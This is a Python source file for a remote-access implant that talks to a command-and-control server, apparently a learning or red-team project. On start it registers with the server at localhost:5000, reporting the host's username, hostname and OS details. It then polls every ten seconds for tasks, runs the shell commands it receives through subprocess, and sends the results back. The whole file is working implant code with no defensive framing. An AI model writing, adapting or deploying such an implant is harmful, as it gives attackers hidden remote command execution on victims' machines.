import requests
from urllib.parse import urljoin
import os
import subprocess
import platform
import hashlib
import time

import shlex


#TODO hash based ids
h = lambda x: hashlib.sha256(x.encode()).hexdigest()

SLEEP = 10


def random_id():
    return os.urandom(16).hex()

implant_id = random_id()




def execute(cmd_args):
    
    cmd = shlex.split(cmd_args)
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p.communicate()
    print(out, err)
    return (out + err).decode()



def sit_aware(args = []):
    initial_data = dict(
    username = execute("whoami"),
    hostname = execute("hostname"),
    os_type = os.name,
    os_name = platform.system(),
    os_version  = platform.release(),
    )
    return initial_data

C2 = "http://localhost:5000"

REGISTER  = "/implant/register"
TASK  = "/implant/task"



def register():
    url = urljoin(C2, REGISTER)
    init_data = sit_aware()

    init_data["implant_id"] = implant_id
    r = requests.post(url, json=init_data)
    if r.status_code == 200:
        print(r.json())
        return True
    else:
        return False


def make_base_payload():
    return {"implant_id": implant_id}


def default_f(args):
    return "Not implemented"

dispatch_table = {
    "execute":execute,
    "sit_aware":sit_aware, 
}


def task_dispatch(tasks):
    results = []
    print("DEBUG", "Oh boy, i got some tasks!", tasks)
    for t in tasks:
        cmd =  t.get("cmd")
        args = t.get("args")
        task_id = t.get("task_id")
        if (not cmd) or (not task_id):
            continue
        f = dispatch_table.get(cmd, default_f )
        result = f(args)
        
        results.append({"task_id": task_id, "result":result})

    return results


def tasking():
    url = urljoin(C2, TASK)
    results = []
    while True:
        time.sleep(SLEEP)
        if results == []:
            r = requests.post(url, json = make_base_payload())
            if r.status_code == 200:
                data = r.json()
                print("Got tasking data: ", data)
                results = task_dispatch(data)
            else:
                results = []
        else:
            payload = make_base_payload()
            payload["results"] = results

            r = requests.post(url, json = payload)
            if r.status_code == 200:
                data = r.json()
                results = task_dispatch(data)
            else:
                results = []




def main_loop():
    
    while True:
        x = register()
        if x:
            break
    
    tasking()
        

    

if __name__ == "__main__":
    print("DEBUG", implant_id)
    main_loop()